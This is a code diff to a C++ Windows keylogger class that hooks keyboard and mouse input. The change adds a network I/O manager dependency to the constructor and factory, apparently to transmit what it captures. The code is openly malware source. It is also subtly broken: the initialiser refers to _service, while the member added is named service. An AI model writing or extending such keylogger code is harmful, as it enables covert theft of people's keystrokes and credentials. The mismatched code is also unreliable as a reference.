@@ -9,6 +9,7 @@
 #include <utility>
 #include <WindowsX.h>
 #include <utils/Config.hpp>
+#include <Network/IOManager.hpp>
 #include "LazySingleton.hpp"
 #include "KeyLogger.hpp"
 
@@ -17,11 +18,11 @@ namespace spi
     class WinKeyLogger : public KeyLogger, public utils::LazySingleton<WinKeyLogger>
     {
     public:
-        WinKeyLogger() = default;
+        explicit WinKeyLogger(net::IOManager &service) : _service(service)
+        {}
 
         ~WinKeyLogger() override = default;
 
-    public:
         void setup() override
         {
             WinKeyLogger::getInstance().setupHooks();
@@ -127,6 +128,7 @@ namespace spi
         }
 
     private:
+        net::IOManager &service;
         HHOOK _keyboardHook{};
         HHOOK _mouseHook{};
     };
@@ -134,9 +136,9 @@ namespace spi
 
 namespace spi::details
 {
-    static always_inline KeyLogPtr createKeyLogger()
+    static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
     {
-        return std::make_unique<WinKeyLogger>();
+        return std::make_unique<WinKeyLogger>(service);
     }
 }
 
